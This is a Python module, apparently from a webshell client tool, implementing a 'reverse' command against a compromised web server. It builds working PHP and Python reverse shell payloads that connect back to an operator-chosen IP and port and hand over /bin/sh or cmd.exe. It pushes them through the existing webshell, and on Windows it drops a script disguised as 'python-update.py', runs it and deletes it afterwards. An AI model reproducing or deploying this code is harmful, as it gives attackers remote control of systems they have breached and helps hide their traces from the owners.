from threading import Thread
from time import sleep

from libs.config import alias, color, gget
from libs.myapp import delay_send, has_env, is_windows, send, get_system_code


def get_reverse_php(ip: str, port: str):
    return """error_reporting (E_ERROR);
ignore_user_abort(true);
ini_set("max_execution_time",0);
$os = substr(PHP_OS,0,3);
$ipaddr = "%s";
$port = "%s";
$descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
$cwd = getcwd();
$msg = php_uname()."\\nTemporary shall\\n";
$type = True;
if($os == "WIN") {
    $env = array("path" => "c:\\\\windows\\\\system32");
} else if(!in_array('proc_open', explode(',', ini_get('disable_functions')))){
        $sock = fsockopen($ipaddr, $port);
        $descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
        );
        $process = proc_open('/bin/sh', $descriptorspec, $pipes);
        proc_close($process);
}
else{
    $env = array("path" => "/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin");
}


if(function_exists("fsockopen")) {
$sock = fsockopen($ipaddr,$port);
} else {
$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
socket_connect($sock,$ipaddr,$port);
socket_write($sock,$msg);
$type = False;
}
fwrite($sock,$msg);
fwrite($sock,"[".getcwd()."]$ ");

while (True) {
    if ($type == True){
        $cmd = fread($sock,1024);
    } else {
        $cmd = socket_read($sock,1024);
    }
    if (substr($cmd,0,3) == "cd " and strlen($cmd) > 3) {
        $cwd = trim(substr($cmd,3));
        chdir($cwd);
        $cwd = getcwd();
    }
    else if (trim(strtolower($cmd)) == "exit") {
        break;
    } else {
        $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);
        if (is_resource($process)) {
            fwrite($pipes[0],$cmd);
            fclose($pipes[0]);
            $msg = stream_get_contents($pipes[1]);
            if ($type == True){
                fwrite($sock,$msg);
            } else {
                socket_write($sock,$msg,strlen($msg));
            }
            fclose($pipes[1]);
            $msg = stream_get_contents($pipes[2]);
            if ($type == True){
                fwrite($sock,$msg);
            } else {
                socket_write($sock,$msg,strlen($msg));
            }
            fclose($pipes[2]);
            proc_close($process);
        }
    }
    fwrite($sock,"[".getcwd()."]$ ");
}
if ($type == True){
    fclose($sock);
} else {socket_close($sock);
}""" % (ip, port)


def get_reverse_python(ip, port):
    if is_windows():
        return """from socket import socket, AF_INET, SOCK_STREAM
from subprocess import PIPE, Popen
from threading import Thread
from io import open as ioopen

def send(client, proc):
    f = ioopen(proc.stdout.fileno(), 'rb', closefd=False)
    while True:
        msg = f.read1(1024)
        if len(msg) == 0: break
        client.send(msg)
def send2(client, proc):
    f = ioopen(proc.stderr.fileno(), 'rb', closefd=False)
    while True:
        msg = proc.stderr.readline()
        if len(msg) == 0: break
        client.send(msg)
client = socket(AF_INET, SOCK_STREAM)
addr = ('%s', %s)
client.connect(addr)
proc = Popen('cmd.exe /K',stdin=PIPE,stdout=PIPE,stderr=PIPE,shell=True, bufsize=1)
t = Thread(target=send, args=(client, proc))
t.setDaemon(True)
t.start()
t = Thread(target=send2, args=(client, proc))
t.setDaemon(True)
t.start()
while True:
    msg = client.recv(1024)
    if len(msg) == 0: break
    proc.stdin.write(msg)
    proc.stdin.flush()""" % (
            ip,
            port,
        )
    else:
        return (
            """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"%s\\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'"""
            % (ip, port)
        )


@alias(True, func_alias="re", p="port", type="reverse_type")
def run(ip: str, port: str, reverse_type: str = "php"):
    """
    reverse

    reverse shell to a host from target system.

    eg: reverse {ip} {port} {type=php}
    """
    reverse_type = str(reverse_type).lower()
    if reverse_type == "php":
        php = get_reverse_php(ip, port)
        t = Thread(target=send, args=(f'{php}',))
        t.setDaemon(True)
        t.start()
    elif reverse_type == "python":
        if has_env("python"):
            python = get_reverse_python(ip, port)
            if is_windows():
                pyname = "python-update.py"
                upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
                text = send(
                    f"print(file_put_contents('{upload_tmp_dir}{pyname}', \"{python}\"));"
                ).r_text.strip()
                if not len(text):
                    print(color.red(f"Failed to write file in {upload_tmp_dir if upload_tmp_dir else 'current'} directory."))
                    return
                t = Thread(target=send, args=(get_system_code(f"python {upload_tmp_dir}{pyname}", False),))
                t.setDaemon(True)
                t.start()
                t2 = Thread(
                    target=delay_send, args=(10.0, f"unlink('{upload_tmp_dir}{pyname}');",)
                )
                t2.setDaemon(True)
                t2.start()
            else:
                t = Thread(target=send, args=(get_system_code(python, False),))
                t.setDaemon(True)
                t.start()
        else:
            print(
                color.red(
                    "The target host does not exist or cannot be found in the python environment."
                )
            )
    else:
        print(color.red("Reverse type Error."))
        return
    sleep(1)
    if (t.isAlive()):
        print(f"\nReverse shell to {ip}:{port} {color.green('success')}.\n")
    else:
        print(f"\nReverse shell {color.red('error')}.\n")
